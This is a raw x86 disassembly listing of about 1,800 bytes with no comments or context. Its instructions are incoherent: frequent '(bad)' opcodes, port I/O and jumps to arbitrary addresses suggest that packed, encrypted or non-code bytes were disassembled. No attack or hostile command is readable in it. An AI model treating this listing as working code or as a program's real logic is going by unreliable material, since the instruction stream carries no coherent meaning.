  40edf9:	xor    ch,BYTE PTR ds:0x583f4dc0
  40edff:	mov    ebx,0x39c4ce31
  40ee04:	loope  0x40edeb
  40ee06:	pop    esi
  40ee07:	mov    dl,BYTE PTR [ebp+edx*2+0x30bcd22]
  40ee0e:	cmp    eax,0x15877dc2
  40ee13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee14:	dec    ebx
  40ee15:	mov    edi,ebp
  40ee17:	shl    esi,1
  40ee19:	shr    DWORD PTR [edx-0x75],0x5b
  40ee1d:	xlat   BYTE PTR ds:[ebx]
  40ee1e:	popa   
  40ee1f:	inc    esi
  40ee20:	xchg   esi,eax
  40ee21:	loope  0x40ee47
  40ee23:	ss jecxz 0x40ee06
  40ee26:	ror    BYTE PTR [edi],1
  40ee28:	sub    al,0x26
  40ee2a:	(bad)  
  40ee2b:	sbb    esp,DWORD PTR [ebp-0x6a]
  40ee2e:	enter  0x406,0x5f
  40ee32:	add    al,0x21
  40ee34:	ins    BYTE PTR es:[edi],dx
  40ee35:	retf   
  40ee36:	aam    0x18
  40ee38:	sub    al,0x2b
  40ee3a:	add    dh,BYTE PTR [eax-0x1]
  40ee3d:	aam    0x1e
  40ee3f:	or     DWORD PTR [eax-0x15cc545a],0xffffff91
  40ee46:	pop    ss
  40ee47:	xor    al,0xf1
  40ee49:	push   eax
  40ee4a:	xchg   ebx,eax
  40ee4b:	and    ebx,DWORD PTR [ecx-0x52]
  40ee4e:	dec    ebx
  40ee4f:	sbb    esp,ebp
  40ee51:	ja     0x40ee63
  40ee53:	push   ss
  40ee54:	rcl    BYTE PTR ds:0x5db088a,0xd3
  40ee5b:	ss daa 
  40ee5d:	adc    eax,0xb818e70c
  40ee63:	fstp   TBYTE PTR [ecx]
  40ee65:	or     ebp,DWORD PTR [edx+esi*8+0x1d836d77]
  40ee6c:	repz xchg edi,eax
  40ee6e:	mov    cl,cl
  40ee70:	repnz sub eax,0x601572d9
  40ee76:	pop    esp
  40ee77:	push   ebx
  40ee78:	inc    esi
  40ee79:	test   eax,0xdd86814d
  40ee7e:	out    0x78,eax
  40ee80:	(bad)  
  40ee81:	cmc    
  40ee82:	fldcw  WORD PTR [ecx+0x7cc367ff]
  40ee88:	jmp    0x40ef02
  40ee8a:	jp     0x40ee2e
  40ee8c:	push   es
  40ee8d:	mov    esi,0x479d67a4
  40ee92:	sub    BYTE PTR [ebp-0xf],cl
  40ee95:	dec    edi
  40ee96:	push   edx
  40ee97:	xchg   ecx,eax
  40ee98:	test   eax,0x431b9876
  40ee9d:	pop    esp
  40ee9e:	inc    edx
  40ee9f:	jmp    0x235f:0x47665c5
  40eea6:	xor    dh,dh
  40eea8:	fdiv   DWORD PTR cs:[ebp-0x388da5ce]
  40eeaf:	adc    cl,ch
  40eeb1:	xchg   ecx,eax
  40eeb2:	ja     0x40ee86
  40eeb4:	add    al,0xd5
  40eeb6:	out    dx,al
  40eeb7:	push   edi
  40eeb8:	mov    DWORD PTR [ebp+edi*4-0x36],ecx
  40eebc:	mov    al,0x88
  40eebe:	sti    
  40eebf:	mov    DWORD PTR [ecx+0x6a],ecx
  40eec2:	mov    ebx,0xa00a30d7
  40eec7:	dec    ebx
  40eec8:	dec    ebp
  40eec9:	popa   
  40eeca:	mov    dl,bh
  40eecc:	popf   
  40eecd:	sbb    ecx,DWORD PTR [edx-0x45147700]
  40eed3:	lods   al,BYTE PTR ds:[esi]
  40eed4:	xchg   DWORD PTR [edi+eiz*1-0x40],edx
  40eed8:	and    BYTE PTR [ebx-0x2a],cl
  40eedb:	test   eax,0x821cffc
  40eee0:	inc    esp
  40eee1:	jge    0x40eec7
  40eee3:	scas   eax,DWORD PTR es:[edi]
  40eee4:	or     esi,edx
  40eee6:	sbb    DWORD PTR [esi+edx*1+0x4a],esi
  40eeea:	dec    ebp
  40eeeb:	stos   DWORD PTR es:[edi],eax
  40eeec:	or     edi,DWORD PTR [ebx-0x400bf5b5]
  40eef2:	imul   ebp,DWORD PTR [bp+di+0x5d],0xdc92ea9e
  40eefa:	add    DWORD PTR [edi+0x73],esi
  40eefd:	mov    bl,0x5b
  40eeff:	imul   esp,DWORD PTR [edx],0xffffffd0
  40ef02:	div    DWORD PTR [ecx]
  40ef04:	dec    ebp
  40ef05:	push   ecx
  40ef06:	daa    
  40ef07:	sub    bl,BYTE PTR [edi+0x15]
  40ef0a:	icebp  
  40ef0b:	cmp    cl,cl
  40ef0d:	adc    al,0xc5
  40ef0f:	cld    
  40ef10:	sub    BYTE PTR [eax],cl
  40ef12:	aas    
  40ef13:	imul   edx,DWORD PTR [ebx+esi*2-0x76],0x7630b151
  40ef1b:	xor    al,0x9c
  40ef1d:	mov    ch,0x84
  40ef1f:	in     eax,0x33
  40ef21:	lahf   
  40ef22:	int    0x83
  40ef24:	mov    ch,0xe1
  40ef26:	and    al,0xa4
  40ef28:	jae    0x40ef3a
  40ef2a:	xor    BYTE PTR [ebx+ecx*4-0x57],0x87
  40ef2f:	xchg   BYTE PTR [edi-0x19],al
  40ef32:	(bad)  
  40ef33:	test   DWORD PTR [eax+0x6a],0x735c3579
  40ef3a:	mov    ah,0xf2
  40ef3c:	cmp    bl,BYTE PTR [edi+0x6e]
  40ef3f:	loopne 0x40ef2f
  40ef41:	(bad)  
  40ef42:	inc    DWORD PTR [eax-0x67387700]
  40ef48:	aam    0xe3
  40ef4a:	sbb    dl,BYTE PTR ds:0x735ac4cc
  40ef50:	xor    ch,BYTE PTR [esi+0x61319b8a]
  40ef56:	loop   0x40ef94
  40ef58:	pusha  
  40ef59:	dec    ecx
  40ef5a:	pushf  
  40ef5b:	rcl    BYTE PTR [ebx+0xe932016],0x26
  40ef62:	or     al,0x7f
  40ef64:	inc    eax
  40ef65:	inc    edx
  40ef66:	jle    0x40efc0
  40ef68:	pop    eax
  40ef69:	adc    BYTE PTR [esi],al
  40ef6b:	jno    0x40efab
  40ef6d:	popa   
  40ef6e:	xchg   BYTE PTR [ecx+edi*8+0x2a],ch
  40ef72:	mov    dl,0x18
  40ef74:	adc    DWORD PTR ds:0xbf945177,ebp
  40ef7a:	in     eax,0xd9
  40ef7c:	ins    DWORD PTR es:[edi],dx
  40ef7d:	xchg   ebp,eax
  40ef7e:	int    0xc7
  40ef80:	loop   0x40efb3
  40ef82:	imul   ebx,DWORD PTR [ebx-0x4eaf517],0x3c
  40ef89:	stos   DWORD PTR es:[edi],eax
  40ef8a:	out    0x37,al
  40ef8c:	imul   esp,esi,0xffffffec
  40ef8f:	jge    0x40ef42
  40ef91:	lods   eax,DWORD PTR ds:[esi]
  40ef92:	mov    esp,0x427c3880
  40ef97:	push   esp
  40ef98:	ror    DWORD PTR [ebp-0x10],0x92
  40ef9c:	cdq    
  40ef9d:	jb     0x40eff8
  40ef9f:	pop    esi
  40efa0:	(bad)  
  40efa1:	loop   0x40ef5e
  40efa3:	inc    eax
  40efa4:	psrad  mm7,QWORD PTR [edi]
  40efa7:	lods   al,BYTE PTR ds:[esi]
  40efa8:	jmp    0x1abb6c1
  40efad:	jmp    0x4222ecc6
  40efb2:	js     0x40f00f
  40efb4:	les    ebx,FWORD PTR [esi+0x6de8803e]
  40efba:	sub    dl,dh
  40efbc:	mov    eax,0xec848ec
  40efc1:	les    ebx,FWORD PTR [edi+0x1a]
  40efc4:	rol    edx,cl
  40efc6:	pop    ds
  40efc7:	cmp    eax,0x4fe50f43
  40efcc:	pop    edi
  40efcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efce:	or     BYTE PTR [esi+0x4dbef1b4],bh
  40efd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40efd5:	fnstsw WORD PTR [esi-0x18deda16]
  40efdb:	jmp    0xa5e2ea4c
  40efe0:	fsub   DWORD PTR [edx-0x38]
  40efe3:	ins    BYTE PTR es:[edi],dx
  40efe4:	push   ebp
  40efe5:	and    ebx,DWORD PTR ds:[eax-0x4502c8d1]
  40efec:	ss int 0x87
  40efef:	lods   eax,DWORD PTR ds:[esi]
  40eff0:	(bad)  
  40eff1:	sbb    edx,DWORD PTR [edx+0xe6872c0]
  40eff7:	pop    ds
  40eff8:	(bad)  
  40eff9:	cdq    
  40effa:	push   eax
  40effb:	sbb    BYTE PTR [edx+ecx*4+0x43a5995d],bl
  40f002:	add    dh,BYTE PTR [esi-0x9]
  40f005:	out    0x9d,eax
  40f007:	mov    bh,0xa8
  40f009:	mov    bh,0x1f
  40f00b:	pop    esp
  40f00c:	pushf  
  40f00d:	add    dl,cl
  40f00f:	add    al,BYTE PTR [edi+ecx*8+0x68]
  40f013:	scas   eax,DWORD PTR es:[edi]
  40f014:	add    ebp,edi
  40f016:	stos   DWORD PTR es:[edi],eax
  40f017:	and    edi,DWORD PTR [eax-0x77]
  40f01a:	ins    DWORD PTR es:[edi],dx
  40f01b:	push   esi
  40f01c:	bound  esp,QWORD PTR [esi]
  40f01e:	div    DWORD PTR [edx-0x1222d2ec]
  40f024:	mov    al,ds:0xc7174204
  40f029:	mov    ah,0x9e
  40f02b:	ins    DWORD PTR es:[edi],dx
  40f02c:	les    ebp,FWORD PTR [edi+edi*2+0x65]
  40f030:	add    eax,0x48f5626b
  40f035:	adc    esi,DWORD PTR [edx-0x25]
  40f038:	ins    BYTE PTR es:[edi],dx
  40f039:	outs   dx,DWORD PTR ds:[esi]
  40f03a:	cmp    dh,BYTE PTR ds:[esp-0x70]
  40f03f:	dec    ebp
  40f040:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f041:	xchg   esi,eax
  40f042:	mov    bh,0x40
  40f044:	jo     0x40f0c0
  40f046:	rcr    ebp,1
  40f048:	or     dh,BYTE PTR [edx]
  40f04a:	or     ah,BYTE PTR ss:[edi+0xf4888a6]
  40f051:	xor    eax,0x9f21501f
  40f056:	(bad)
  40f05a:	or     DWORD PTR [eax+0x51],ebx
  40f05d:	jg     0x40efed
  40f05f:	add    cl,BYTE PTR [ebx]
  40f061:	aas    
  40f062:	add    eax,DWORD PTR [edx-0x6281f90a]
  40f068:	sub    BYTE PTR [ecx+eiz*2+0x59],0x67
  40f06d:	pop    ss
  40f06e:	fstp   TBYTE PTR [ebp-0x35f41984]
  40f074:	jo     0x40f0f3
  40f076:	cmp    ah,BYTE PTR [esi-0x21]
  40f079:	out    0xed,eax
  40f07b:	ins    DWORD PTR es:[edi],dx
  40f07c:	dec    esi
  40f07d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f07e:	dec    eax
  40f07f:	sbb    al,0xdf
  40f081:	inc    ecx
  40f082:	into   
  40f083:	xchg   esi,eax
  40f084:	pop    es
  40f085:	xor    DWORD PTR [edi],esi
  40f087:	stos   BYTE PTR es:[edi],al
  40f088:	push   cs
  40f089:	sbb    ebx,DWORD PTR [ecx+0x14988973]
  40f08f:	xchg   DWORD PTR [eax+0x23],eax
  40f092:	into   
  40f093:	and    BYTE PTR [di],ah
  40f096:	inc    esp
  40f097:	cs jb  0x40f0ad
  40f09a:	jo     0x40f041
  40f09c:	daa    
  40f09d:	adc    al,0x3b
  40f09f:	mov    ch,0x69
  40f0a1:	pushf  
  40f0a2:	mov    gs,WORD PTR [edx+0x18d3d501]
  40f0a8:	(bad)  
  40f0a9:	cmp    DWORD PTR ds:0x898d387f,ecx
  40f0af:	ss push ss
  40f0b1:	dec    esi
  40f0b2:	pop    eax
  40f0b3:	jl     0x40f12c
  40f0b5:	add    cl,ah
  40f0b7:	rcr    eax,1
  40f0b9:	sahf   
  40f0ba:	jle    0x40f0f9
  40f0bc:	js     0x40f060
  40f0be:	or     ecx,DWORD PTR [edx]
  40f0c0:	cli    
  40f0c1:	push   0xcd49a099
  40f0c6:	sub    al,bl
  40f0c8:	adc    BYTE PTR [ebp+0x3b423b09],ch
  40f0ce:	stc    
  40f0cf:	dec    edx
  40f0d0:	pusha  
  40f0d1:	jmp    0x60dd91de
  40f0d6:	aad    0xf
  40f0d8:	inc    edi
  40f0d9:	pop    esi
  40f0da:	and    BYTE PTR [esi+0x46],al
  40f0dd:	aad    0x55
  40f0df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0e0:	(bad)  
  40f0e1:	mov    edi,0xe1560361
  40f0e6:	mov    cl,0x5c
  40f0e8:	xor    ebp,DWORD PTR [edi]
  40f0ea:	mov    edx,0xc4f80dfb
  40f0ef:	dec    edx
  40f0f0:	push   es
  40f0f1:	mov    eax,0x3c06f38a
  40f0f6:	call   0xb42b:0x18fb0e4c
  40f0fd:	std    
  40f0fe:	es inc esi
  40f100:	lahf   
  40f101:	bound  esp,QWORD PTR [ebx-0x8]
  40f104:	mov    al,ds:0x3f6f8662
  40f109:	rcl    DWORD PTR [ebp-0x10],1
  40f10c:	jp     0x40f0c6
  40f10e:	sti    
  40f10f:	fstp   DWORD PTR [ecx-0x3c7a8afa]
  40f115:	in     al,0xd
  40f117:	add    BYTE PTR [edx],cl
  40f119:	jmp    0x40f0f0
  40f11b:	add    BYTE PTR gs:[ebp+0xb],bl
  40f11f:	pop    edx
  40f120:	add    DWORD PTR [esi],0x73c10b1
  40f126:	test   eax,0x410b0a58
  40f12b:	imul   edx,DWORD PTR [ebp+0x2f],0x4c
  40f12f:	je     0x40f0eb
  40f131:	inc    eax
  40f132:	(bad)  
  40f133:	daa    
  40f134:	cmp    ebx,DWORD PTR [ecx+ecx*8-0x639968d4]
  40f13b:	xor    al,0x69
  40f13d:	or     esi,DWORD PTR [eax+0x3c]
  40f140:	rcr    BYTE PTR [edi],1
  40f142:	es sar ecx,0xad
  40f146:	xor    DWORD PTR [edi],eax
  40f148:	mov    edi,0x8e045e1e
  40f14d:	imul   DWORD PTR [esi-0x45093937]
  40f153:	sub    BYTE PTR [ecx],0x67
  40f156:	mov    al,ds:0xc3bad9e0
  40f15b:	add    ecx,DWORD PTR [edx-0x34]
  40f15e:	push   ebp
  40f15f:	test   eax,0x4c8d66ed
  40f164:	aas    
  40f165:	repnz inc edx
  40f167:	icebp  
  40f168:	lods   eax,DWORD PTR ds:[esi]
  40f169:	fld    QWORD PTR [ecx+esi*1+0x628c5e66]
  40f170:	xchg   esi,eax
  40f171:	nop
  40f172:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f174:	sub    ah,BYTE PTR [eax+0x21]
  40f177:	jle    0x40f134
  40f179:	dec    BYTE PTR ds:0x49255c86
  40f17f:	jge    0x40f161
  40f181:	ja     0x40f19e
  40f183:	lods   eax,DWORD PTR ds:[esi]
  40f184:	push   edi
  40f185:	cld    
  40f186:	nop
  40f187:	into   
  40f188:	or     eax,0xc3944b00
  40f18d:	icebp  
  40f18e:	mov    dh,0x4
  40f190:	aam    0xa2
  40f192:	jnp    0x40f116
  40f194:	(bad)  
  40f195:	out    dx,al
  40f196:	sub    BYTE PTR [ecx+0x4bc17e56],ah
  40f19c:	fwait
  40f19d:	jp     0x40f16e
  40f19f:	mov    eax,ds:0x13ddc642
  40f1a4:	pop    ebp
  40f1a5:	jge    0x40f1ed
  40f1a7:	stos   DWORD PTR es:[edi],eax
  40f1a8:	(bad)  [esp+ebx*2+0x47]
  40f1ac:	inc    esi
  40f1ad:	fistp  QWORD PTR [edi+0x6d38dea2]
  40f1b3:	mov    BYTE PTR [esi],ch
  40f1b5:	cmp    ecx,DWORD PTR [ecx]
  40f1b7:	push   edi
  40f1b8:	daa    
  40f1b9:	cwde   
  40f1ba:	jnp    0x40f1f1
  40f1bc:	ret    0x30af
  40f1bf:	adc    dl,ah
  40f1c1:	ss inc ebx
  40f1c3:	push   esp
  40f1c4:	pop    es
  40f1c5:	sar    BYTE PTR [edi+0x66],0xa1
  40f1c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1ca:	sbb    al,0x5a
  40f1cc:	mov    esp,0x8388d1ea
  40f1d1:	pop    DWORD PTR [esi+0x18ec32c5]
  40f1d7:	xchg   edx,eax
  40f1d8:	aad    0x68
  40f1da:	xor    DWORD PTR [ebx+0x64],ecx
  40f1dd:	cmp    BYTE PTR [ebp+0x20],bh
  40f1e0:	test   DWORD PTR [ebp+0x1c],eax
  40f1e3:	arpl   WORD PTR [ebx],sp
  40f1e5:	test   al,0x34
  40f1e7:	pop    edx
  40f1e8:	cmp    cl,BYTE PTR [edi-0x7b45f497]
  40f1ee:	mov    bl,0xbf
  40f1f0:	mov    ch,0xda
  40f1f2:	jge    0x40f26e
  40f1f4:	pop    ebx
  40f1f5:	dec    esi
  40f1f6:	cmp    al,0xc2
  40f1f8:	ins    DWORD PTR es:[edi],dx
  40f1f9:	xor    al,0x97
  40f1fb:	jmp    0xe1ffe8ed
  40f200:	ins    BYTE PTR es:[edi],dx
  40f201:	aaa    
  40f202:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f203:	push   esp
  40f204:	mov    ebp,0x9119cf7c
  40f209:	or     al,0x17
  40f20b:	fsubr  DWORD PTR [edx+0x5c]
  40f20e:	repz sbb DWORD PTR [edx],0x52df8923
  40f215:	sub    eax,0x56aa43c7
  40f21a:	daa    
  40f21b:	push   ss
  40f21c:	popf   
  40f21d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f21e:	dec    ecx
  40f21f:	cli    
  40f220:	lds    edx,FWORD PTR [esp+edx*2-0x69]
  40f224:	into   
  40f225:	dec    ebp
  40f226:	daa    
  40f227:	or     DWORD PTR ds:0x30215038,0xffffffb1
  40f22e:	in     al,dx
  40f22f:	push   0x5c2d625c
  40f234:	imul   eax,DWORD PTR [edi+0x4271b98f],0x39485589
  40f23e:	xchg   ebx,eax
  40f23f:	icebp  
  40f240:	enter  0xad62,0x48
  40f244:	push   ebx
  40f245:	cmp    bh,BYTE PTR [ebx]
  40f247:	repnz adc DWORD PTR [esi],ebx
  40f24a:	pop    ebp
  40f24b:	scas   eax,DWORD PTR es:[edi]
  40f24c:	cmp    eax,0x541e9b47
  40f251:	(bad)  
  40f252:	hlt    
  40f253:	fwait
  40f254:	push   0xae54b93a
  40f259:	jb     0x40f2b5
  40f25b:	jbe    0x40f2b8
  40f25d:	fwait
  40f25e:	imul   ebp,ebx,0xa82bd1b2
  40f264:	pop    esp
  40f265:	xor    bl,BYTE PTR ds:0x80f5707a
  40f26b:	xchg   ecx,eax
  40f26c:	add    al,0xc8
  40f26e:	std    
  40f26f:	cmp    DWORD PTR [edx],edi
  40f271:	into   
  40f272:	fs mov dh,0x82
  40f275:	sub    esi,DWORD PTR [esi+0x36c297c9]
  40f27b:	xchg   DWORD PTR [ecx+0x4c],edi
  40f27e:	out    0xd6,eax
  40f280:	mov    ecx,0x76157170
  40f285:	sti    
  40f286:	inc    edi
  40f287:	mov    dh,0x8a
  40f289:	into   
  40f28a:	jl     0x40f21f
  40f28c:	fstp   QWORD PTR [eax+esi*4-0x4cbae2ee]
  40f293:	jns    0x40f307
  40f295:	lea    esp,[edx-0x80]
  40f298:	or     DWORD PTR cs:[eax],edx
  40f29b:	pushf  
  40f29c:	test   DWORD PTR [ecx],eax
  40f29e:	pushf  
  40f29f:	lea    edx,[edi+0x56]
  40f2a2:	or     bh,BYTE PTR [ebx]
  40f2a4:	loope  0x40f23c
  40f2a6:	sbb    al,dh
  40f2a8:	mov    dh,BYTE PTR [ebx+0xa]
  40f2ab:	push   ds
  40f2ac:	or     DWORD PTR [edi],0x2c
  40f2af:	mov    WORD PTR [ebp-0x27],?
  40f2b2:	loop   0x40f307
  40f2b4:	fdiv   DWORD PTR [eax+0x6a03b0f4]
  40f2ba:	popa   
  40f2bb:	mov    bl,0x9d
  40f2bd:	sub    ch,BYTE PTR [esi-0x971cc3]
  40f2c3:	stc    
  40f2c4:	out    0x84,eax
  40f2c6:	fimul  WORD PTR [ebx]
  40f2c8:	cmc    
  40f2c9:	in     al,0xbc
  40f2cb:	push   ebx
  40f2cc:	inc    ebx
  40f2cd:	pop    esi
  40f2ce:	mov    ah,cl
  40f2d0:	xor    eax,0xff8b39fd
  40f2d5:	sbb    BYTE PTR [eax-0x1e3e9c31],cl
  40f2db:	in     eax,dx
  40f2dc:	or     al,0xe5
  40f2de:	test   eax,0xb40f88b6
  40f2e3:	or     al,0x80
  40f2e5:	test   al,0x8f
  40f2e7:	push   0x5d
  40f2e9:	retf   0x18c9
  40f2ec:	xchg   edx,eax
  40f2ed:	add    BYTE PTR [edx+0x5c],dl
  40f2f0:	xlat   BYTE PTR ds:[ebx]
  40f2f1:	mov    cl,0x22
  40f2f3:	adc    BYTE PTR ds:0xb6280ade,ch
  40f2f9:	add    al,0x17
  40f2fb:	imul   edx,DWORD PTR [ebx],0xffffffb9
  40f2fe:	scas   eax,DWORD PTR es:[edi]
  40f2ff:	pushf  
  40f300:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f301:	pop    esi
  40f302:	mov    DWORD PTR [edx],ecx
  40f304:	jno    0x40f322
  40f306:	shl    DWORD PTR [esi+0x4b],1
  40f309:	push   es
  40f30a:	jge    0x40f2f6
  40f30c:	sbb    cl,bl
  40f30e:	inc    eax
  40f30f:	mov    ds:0x3648ae0a,al
  40f314:	sbb    DWORD PTR [esi],esi
  40f316:	out    0xe9,al
  40f318:	scas   eax,DWORD PTR es:[edi]
  40f319:	mov    eax,0x71040e04
  40f31e:	and    al,0x7e
  40f320:	sbb    edi,esp
  40f322:	sbb    bh,ch
  40f324:	adc    ebp,0xffffff86
  40f327:	nop
  40f328:	or     eax,0x6b219f8
  40f32d:	pushf  
  40f32e:	dec    esp
  40f32f:	push   ecx
  40f330:	in     al,dx
  40f331:	xchg   esp,eax
  40f332:	mov    ecx,0xe16c08c2
  40f337:	push   0xffffff9a
  40f339:	pop    ebx
  40f33a:	and    ah,BYTE PTR gs:[eax-0x47c250ac]
  40f341:	icebp  
  40f342:	adc    al,0x75
  40f344:	push   0xffffff84
  40f346:	ror    ch,cl
  40f348:	cdq    
  40f349:	js     0x40f38c
  40f34b:	pop    esp
  40f34c:	ror    BYTE PTR [esi],cl
  40f34e:	mov    esp,0x182e8d38
  40f353:	cwde   
  40f354:	stc    
  40f355:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f356:	cmp    ebp,0xfffffffb
  40f359:	cwde   
  40f35a:	nop
  40f35b:	push   ecx
  40f35c:	sbb    al,0xe1
  40f35e:	cli    
  40f35f:	add    eax,0x1d385246
  40f364:	div    BYTE PTR [edx+0x9c0344]
  40f36a:	mov    BYTE PTR [edi],dh
  40f36c:	and    eax,0xb0bbfad6
  40f371:	dec    esi
  40f372:	jo     0x40f36e
  40f374:	jns    0x40f3d9
  40f376:	cmp    edi,DWORD PTR [ecx+ebx*2]
  40f379:	pop    edi
  40f37a:	cmp    ebp,edx
  40f37c:	sahf   
  40f37d:	lds    edi,FWORD PTR [ebp-0x34beb906]
  40f383:	fadd   QWORD PTR [edx]
  40f385:	jo     0x40f3b2
  40f387:	pop    ebx
  40f388:	mov    ah,0x14
  40f38a:	xor    eax,0x8ad7f39d
  40f38f:	test   al,dh
  40f391:	xchg   DWORD PTR [eax-0x10a61d52],ebp
  40f397:	jp     0x40f390
  40f399:	scas   eax,DWORD PTR es:[edi]
  40f39a:	lods   eax,DWORD PTR ds:[esi]
  40f39b:	xor    BYTE PTR [eax+0x6b],0x7c
  40f39f:	loop   0x40f3cc
  40f3a1:	shr    eax,cl
  40f3a3:	shl    BYTE PTR [ebx+0x39f0782],cl
  40f3a9:	lods   al,BYTE PTR ds:[esi]
  40f3aa:	lds    eax,FWORD PTR [edx+ebx*1]
  40f3ad:	mov    ?,WORD PTR [edx]
  40f3af:	add    al,0x19
  40f3b1:	adc    BYTE PTR [edx+0x14],dh
  40f3b4:	cmc    
  40f3b5:	loope  0x40f3d0
  40f3b7:	xchg   edx,eax
  40f3b8:	or     ebx,esp
  40f3ba:	test   al,0x64
  40f3bc:	ins    BYTE PTR es:[edi],dx
  40f3bd:	fst    DWORD PTR [ecx+0x58]
  40f3c0:	push   ecx
  40f3c1:	test   al,0xc8
  40f3c3:	sub    DWORD PTR [ebx+0x22625461],edx
  40f3c9:	ror    BYTE PTR [ebx],cl
  40f3cb:	add    ebp,DWORD PTR [esi]
  40f3cd:	lahf   
  40f3ce:	xchg   edi,eax
  40f3cf:	xchg   esi,eax
  40f3d0:	into   
  40f3d1:	push   0xffffffc6
  40f3d3:	ins    DWORD PTR es:[edi],dx
  40f3d4:	mov    ebp,0x4dd1464d
  40f3d9:	dec    edi
  40f3da:	pop    eax
  40f3db:	rcr    BYTE PTR [ecx],0x94
  40f3de:	add    DWORD PTR [eax-0x25541036],esp
  40f3e4:	or     DWORD PTR ss:[ebx-0x6b],edx
  40f3e8:	inc    ecx
  40f3e9:	test   al,0xb7
  40f3eb:	inc    ebp
  40f3ec:	push   es
  40f3ed:	cmp    edx,eax
  40f3ef:	sbb    BYTE PTR [ecx-0x8aa3626],dh
  40f3f5:	out    0x88,eax
  40f3f7:	jl     0x40f473
  40f3f9:	xchg   esi,eax
  40f3fa:	and    ecx,DWORD PTR [edx+0x4e]
  40f3fd:	and    esp,DWORD PTR [esi-0x24]
  40f400:	lock pusha 
  40f402:	xchg   edx,eax
  40f403:	inc    eax
  40f404:	push   esi
  40f405:	ins    DWORD PTR es:[edi],dx
  40f406:	loopne 0x40f401
  40f408:	inc    edx
  40f409:	xchg   esi,eax
  40f40a:	push   eax
  40f40b:	mov    ds:0x2a2afda2,al
  40f410:	push   ecx
  40f411:	div    BYTE PTR [eax-0x5c1d3987]
  40f417:	lds    esp,FWORD PTR [edi-0x2933dec2]
  40f41d:	fwait
  40f41e:	call   0x55f4:0x8b58f905
  40f425:	push   eax
  40f426:	jae    0x40f459
  40f428:	push   cs
  40f429:	push   eax
  40f42a:	cmp    DWORD PTR [ebx-0x12],ecx
  40f42d:	popf   
  40f42e:	pusha  
  40f42f:	adc    BYTE PTR [esp+ebp*8],al
  40f432:	lods   al,BYTE PTR ds:[esi]
  40f433:	adc    BYTE PTR [edi],ah
  40f435:	cli    
  40f436:	xor    eax,0x211b6a56
  40f43b:	cmc    
  40f43c:	jge    0x40f3fb
  40f43e:	fist   WORD PTR [edx-0x9c3fe5a]
  40f444:	xor    esp,DWORD PTR [esi+0x51]
  40f447:	aam    0xaf
  40f449:	xor    edx,DWORD PTR [ebp+0x55]
  40f44c:	cli    
  40f44d:	mov    edi,0xe5c0fb75
  40f452:	imul   esi,DWORD PTR [eax-0x44],0x67d5d036
  40f459:	cmp    DWORD PTR [esi+0x1a59d02],edi
  40f45f:	inc    esi
  40f460:	pop    ss
  40f461:	add    BYTE PTR [ebp+0xa],bh
  40f464:	add    eax,0x7f7ba70f
  40f469:	push   0x54
  40f46b:	imul   ebp,edi,0x7
  40f46e:	mov    ds:0x6e6bee16,al
  40f473:	pusha  
  40f474:	rcr    BYTE PTR [edi+ebp*1+0x19],cl
  40f478:	rcl    DWORD PTR [edx+0x53],cl
  40f47b:	or     DWORD PTR [edx+edx*1],esp
  40f47e:	mov    edx,DWORD PTR [esp+ebp*4-0x1b5efa87]
  40f485:	fsub   st(2),st
  40f487:	rcr    DWORD PTR [ebp+0x6],0x98
  40f48b:	mov    edx,0xefb2f115
  40f490:	push   0x580d971d
  40f495:	fst    DWORD PTR [edx+0x34]
  40f498:	xor    dl,BYTE PTR [edx+esi*8-0x49ade36e]
  40f49f:	lods   eax,DWORD PTR ds:[esi]
  40f4a0:	sub    al,BYTE PTR [ecx+eiz*2+0x41091c53]
  40f4a7:	cmc    
  40f4a8:	jp     0x40f4a5
  40f4aa:	sub    al,0xdc
  40f4ac:	xor    dh,BYTE PTR [esi]
  40f4ae:	loop   0x40f4b7
  40f4b0:	imul   DWORD PTR [ebp+0x7e8828da]
  40f4b6:	dec    eax
  40f4b7:	mov    al,ds:0xcb2e2c7f
  40f4bc:	mov    ds:0x84cd4c85,al
  40f4c1:	hlt    
  40f4c2:	adc    bh,dh
  40f4c4:	or     bl,dh
  40f4c6:	mov    dl,bl
  40f4c8:	cs cli 
  40f4ca:	xor    bh,BYTE PTR [eax]
  40f4cc:	int3   
  40f4cd:	mov    al,ds:0x36695902
  40f4d2:	sub    eax,0x28c65a78
  40f4d7:	iret   
  40f4d8:	popf   
  40f4d9:	mov    ds:0xe6d0013a,eax
  40f4de:	cld    
  40f4df:	lea    esp,[eax-0x97e58dd]
  40f4e5:	jge    0x40f4b9
  40f4e7:	push   edx
  40f4e8:	xchg   esp,eax
  40f4e9:	and    eax,0x4a745bb0
  40f4ee:	fadd   QWORD PTR [ebp-0x17]
  40f4f1:	pop    ebp
  40f4f2:	lods   al,BYTE PTR ds:[esi]
  40f4f3:	repnz inc ecx
  40f4f5:	mov    edi,0x70514473
  40f4fa:	retf   0x8566
  40f4fd:	xor    BYTE PTR [esi+ebx*4+0x37],bh
  40f501:	inc    ecx
  40f502:	fisub  DWORD PTR [ebx]
  40f504:	or     bl,al
  40f506:	pop    es
  40f507:	mov    cl,0x45
  40f509:	retf   0x8baa
  40f50c:	sbb    eax,DWORD PTR [ecx+ebp*8-0x15]
  40f510:	into   
  40f511:	mov    ah,0xe1
  40f513:	int    0x73
  40f515:	mov    al,ds:0x1c11cd73
  40f51a:	stos   BYTE PTR es:[edi],al
  40f51b:	push   es
  40f51c:	mov    ah,0x2b
  40f51e:	stos   BYTE PTR es:[edi],al
  40f51f:	mov    ebp,0xb7469875
  40f524:	enter  0x4797,0xb2
  40f528:	mov    cl,0xd9
  40f52a:	rcr    DWORD PTR [edi-0x2e140e96],0x32
  40f531:	sbb    ah,BYTE PTR [ebp+0x11]
  40f534:	sbb    BYTE PTR [ebx+eiz*1+0xa],ah
  40f538:	clc    
  40f539:	mov    al,0xcb
  40f53b:	loop   0x40f571
  40f53d:	jne    0x40f515
